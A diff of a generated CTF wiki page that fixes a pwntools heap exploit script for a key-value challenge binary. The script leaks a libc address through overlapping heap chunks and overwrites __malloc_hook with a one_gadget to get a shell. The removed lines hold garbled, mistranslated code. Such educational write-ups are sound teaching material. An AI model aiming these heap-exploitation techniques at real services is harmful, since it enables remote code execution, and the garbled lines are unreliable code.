@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.1">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.4031d38b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.30686662.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.224b79ff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -5934,215 +5934,113 @@ __int64 v4; // rbp
 <h3 id="exploit_1">exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
 <p>Since the original libc is 2.19 version, loading some strange problems is more troublesome, and this problem does not use the unique features of 2.19, so I used the 2.23 libc for debugging, the version is ubuntu10.</p>
 <div class="codehilite"><pre><span></span><span class="ch">#! /usr/bin/env python2</span>
-
 <span class="c1"># -*- coding: utf-8 -*-</span>
-
-<span class="c1"># vim: hay = utf-8</span>
-
+<span class="c1"># vim:fenc=utf-8</span>
 
 <span class="kn">import</span> <span class="nn">sys</span>
-
-<span class="kn">import</span>
-<span class="nn">import</span> <span class="nn">os.path</span>
-
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">os.path</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
 <span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
 
-
-
 <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
-
     <span class="n">DEBUG</span> <span class="o">=</span> <span class="mi">0</span>
-
     <span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-
     <span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
 
-
-
     <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-
 <span class="k">else</span><span class="p">:</span>
-
     <span class="n">DEBUG</span> <span class="o">=</span> <span class="mi">1</span>
-
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
-
         <span class="n">PATH</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-
-
 
     <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">PATH</span><span class="p">)</span>
 
 
-
-
-
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span> <span class="c1"># ubuntu 16.04</span>
 
-
-
 <span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">command_num</span><span class="p">):</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;command:&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">command_num</span><span class="p">))</span>
 
 
-
-
-
 <span class="k">def</span> <span class="nf">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
-
     <span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;PUT&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;key:&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
 
-
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;size:&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;data:&#39;</span><span class="p">)</span>
-
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">:</span>
-
-<span class="n">ps</span> <span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span> <span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="c1">#39;x00&amp;#39;))</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
     <span class="k">else</span><span class="p">:</span>
-
-        <span class="n">p</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-
-
+        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
-
     <span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;DEL&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;key:&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
-
-
 
 
 <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
-
     <span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;key:&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">)</span>
-
     <span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; bytes&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39; bytes&#39;</span><span class="p">))</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">recv</span> <span class="k">return</span> <span class="p">(</span><span class="n">whether</span><span class="p">)</span>
-
-
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-
     <span class="c1"># avoid complicity of structure malloc</span>
-
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
-
         <span class="n">put</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
 
-
-
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
-
-<span class="n">delete</span> <span class="p">(</span><span class="nb">str</span> <span class="p">(</span><span class="n">i</span><span class="p">))</span>
-
+        <span class="n">delete</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
 
     <span class="c1"># allocate what we want in order</span>
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;6&#39;</span><span class="p">)</span>
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;defense&#39;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s1">&#39;defense-data&#39;</span><span class="p">)</span>
 
 
-
-
-
     <span class="c1"># free those need to be freed</span>
-
     <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
-
     <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
-
     <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
-
-
 
     <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x1f0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4e0</span><span class="p">))</span>
 
-
-
     <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
 
-
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;0x200&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;fillup&#39;</span><span class="p">)</span>
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;0x200 fillup&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;fillup again&#39;</span><span class="p">)</span>
 
-
-
     <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc leak: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">libc_leak</span><span class="p">)</span>
-
-
 
     <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
 
-
-
     <span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_base: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
 
-
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;fastatk&#39;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x58</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;prepare&#39;</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;prepare data&#39;</span><span class="p">)</span>
 
-
-
     <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4526a</span>
-
     <span class="n">put</span><span class="p">(</span><span class="s1">&#39;attack&#39;</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
-
-
 
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;DEL&#39;</span><span class="p">)</span> <span class="c1"># malloc(8) triggers one_gadget</span>
 
-
-
     <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
-
-
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-
     <span class="n">main</span><span class="p">()</span>
 </pre></div>
                 
@@ -6209,7 +6107,7 @@ __int64 v4; // rbp
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.ffb616e8.js"></script>
+      <script src="../../../../assets/javascripts/application.6579397f.js"></script>
       
         
         
